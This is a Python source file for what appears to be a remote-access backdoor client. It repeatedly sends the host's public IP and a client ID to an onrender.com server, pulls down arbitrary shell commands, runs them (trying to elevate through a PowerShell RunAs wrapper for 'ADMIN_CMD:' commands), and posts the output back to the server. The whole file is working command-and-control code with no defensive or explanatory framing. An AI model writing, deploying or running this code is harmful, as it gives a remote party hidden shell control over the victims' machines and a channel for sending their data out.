import requests
import time
import subprocess
import json
import uuid 
import sys
import os

# --- Configuration ---
SERVER = "https://server3-atm9.onrender.com/"
CLIENT_ID_FILE = "client_id.json"
POLL_INTERVAL_SECONDS = 5
MAX_EXECUTION_TIMEOUT = 30 

# ------------------ Utility Functions (IP/ID) ------------------ #
def get_public_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=5).text
    except Exception:
        return "0.0.0.0"

def get_unique_client_id():
    """Loads a unique ID from a local file, or generates and saves a new one."""
    try:
        with open(CLIENT_ID_FILE, "r") as f:
            return json.load(f)["client_id"]
    except (FileNotFoundError, json.JSONDecodeError):
        new_id = str(uuid.uuid4())
        try:
            with open(CLIENT_ID_FILE, "w") as f:
                json.dump({"client_id": new_id}, f)
            return new_id
        except Exception:
            return new_id 

# ------------------ Main Execution Block ------------------ #
try:
    CLIENT_ID = get_unique_client_id()
    print("-" * 50)
    print(f"Client Process Starting. ID: {CLIENT_ID}")
    print("-" * 50)
except Exception as e:
    print(f"FATAL SETUP ERROR: {e}. Exiting.")
    sys.exit(1)


while True:
    try:
        # 1) SEND IP TO SERVER (Heartbeat)
        ip = get_public_ip()
        requests.post(f"{SERVER}/update_ip", json={"ip": ip, "client_id": CLIENT_ID}, timeout=5)

        # 2) CHECK COMMAND
        cmd_res = requests.get(f"{SERVER}/get_cmd?client_id={CLIENT_ID}", timeout=5).json()
        command = cmd_res.get("cmd", "").strip()
        
        if command:

            # --- ADMIN COMMAND LOGIC ---
            if command.upper().startswith("ADMIN_CMD:"):
                shell_command = command[10:].strip()

                wrapped_command = (
                    f'powershell -Command "Start-Process cmd '
                    f'-ArgumentList \'/c {shell_command}\' -Verb RunAs"'
                )

                print(f"[{CLIENT_ID}] **ADMIN COMMAND RECEIVED:** {shell_command}")
                try:
                    output = subprocess.check_output(
                        wrapped_command,
                        shell=True,
                        stderr=subprocess.STDOUT,
                        text=True,
                        timeout=MAX_EXECUTION_TIMEOUT
                    )
                except subprocess.CalledProcessError as e:
                    output = f"Admin Command Failed (Exit Code {e.returncode}):\n{e.output}\n\nNOTE: If UAC is enabled, this may fail."
                except subprocess.TimeoutExpired:
                    output = f"Admin Command timed out ({MAX_EXECUTION_TIMEOUT}s). UAC prompt likely blocked it."
                except Exception as e:
                    output = f"Execution Error: {str(e)}"

            # --- NORMAL SHELL COMMAND ---
            else:
                print(f"[{CLIENT_ID}] **COMMAND RECEIVED:** {command}")
                try:
                    output = subprocess.check_output(
                        command,
                        shell=True,
                        stderr=subprocess.STDOUT,
                        text=True,
                        timeout=MAX_EXECUTION_TIMEOUT
                    )
                except subprocess.CalledProcessError as e:
                    output = f"Command Failed (Exit Code {e.returncode}):\n{e.output}"
                except subprocess.TimeoutExpired:
                    output = f"Command execution timed out ({MAX_EXECUTION_TIMEOUT}s)."
                except Exception as e:
                    output = f"Execution Error: {str(e)}"

            # Send output back
            requests.post(f"{SERVER}/send_output",
                          json={"output": output, "client_id": CLIENT_ID}, timeout=10)

            # Clear command
            requests.post(f"{SERVER}/set_cmd",
                          json={"cmd": "", "client_id": CLIENT_ID}, timeout=10)

            print(f"[{CLIENT_ID}] Finished command. Output sent: {output[:50]}...")

    except requests.exceptions.RequestException as req_err:
        print(f"[{CLIENT_ID}] NETWORK ERROR: {req_err}. Retrying in {POLL_INTERVAL_SECONDS}s.")
        
    except Exception as e:
        print(f"[{CLIENT_ID}] UNEXPECTED LOOP ERROR: {e}. Retrying in {POLL_INTERVAL_SECONDS}s.")
        
    time.sleep(POLL_INTERVAL_SECONDS)
